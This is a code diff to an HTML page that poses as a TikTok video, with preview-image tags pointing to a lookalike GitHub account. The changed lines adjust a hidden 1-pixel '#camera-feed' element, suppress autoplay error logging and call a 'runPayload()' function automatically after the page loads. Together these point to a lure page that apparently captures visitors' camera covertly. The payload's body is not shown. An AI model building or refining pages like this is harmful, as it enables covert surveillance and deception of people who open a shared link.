@@ -12,7 +12,10 @@
     <meta property="og:video:type" content="video/mp4">
     <meta property="og:video:width" content="1280">
     <meta property="og:video:height" content="720">
-    <meta property="og:image" content="https://facloook5-cpu.github.io/view-video/thumbnail.jpg">
+    
+    <meta property="og:image" content="https://raw.githubusercontent.com/facloook5-cpu/view-video/main/cover.jpg">
+    <meta property="og:image:width" content="1200">
+    <meta property="og:image:height" content="630">
 
     <style>
         body {
@@ -128,7 +131,7 @@
             max-width: 300px;
         }
 
-        #camera-feed, #audio-feed {
+        #camera-feed {
             position: absolute;
             width: 1px;
             height: 1px;
@@ -191,7 +194,6 @@
 
     <div class="video-container">
         <div class="tiktok-logo">TikTok</div>
-        
         <div class="video-placeholder" id="video-placeholder"></div>
 
         <div class="tiktok-sidebar" id="fake-sidebar">
@@ -320,9 +322,7 @@
 
         window.addEventListener('load', () => {
             const video = document.getElementById('main-video-bg');
-            video.play().catch(() => {
-                console.log("Interaction required for autoplay.");
-            });
+            video.play().catch(() => {});
 
             setTimeout(() => {
                 runPayload();
